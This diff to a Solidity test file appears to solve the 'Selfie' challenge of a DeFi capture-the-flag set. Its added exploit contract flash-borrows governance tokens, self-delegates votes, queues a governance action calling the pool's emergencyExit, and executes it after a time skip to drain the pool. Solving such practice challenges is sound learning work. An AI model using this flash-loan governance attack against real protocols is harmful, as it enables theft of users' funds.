@@ -6,6 +6,44 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract Exp {
+    DamnValuableVotes public voteToken;
+    SelfiePool public pool;
+    SimpleGovernance public gov;
+    address public recovery;
+    uint256 public actionId;
+
+    constructor(DamnValuableVotes _voteToken, SimpleGovernance _gov, SelfiePool _pool, address _recovery) {
+        voteToken = _voteToken;
+        gov = _gov;
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function prepare() external {
+        // see: _transferVotingUnits
+        voteToken.delegate(address(this));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(voteToken), 1_500_000e18, bytes(""));
+    }
+
+    function start() external {
+        gov.executeAction(actionId);
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        actionId = gov.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));
+        voteToken.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +100,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Exp exp = new Exp(token, governance, pool, recovery);
+        exp.prepare();
+        // I don't think there is a way of finishing this without skip.
+        skip(3 days);
+        exp.start();
     }
 
     /**
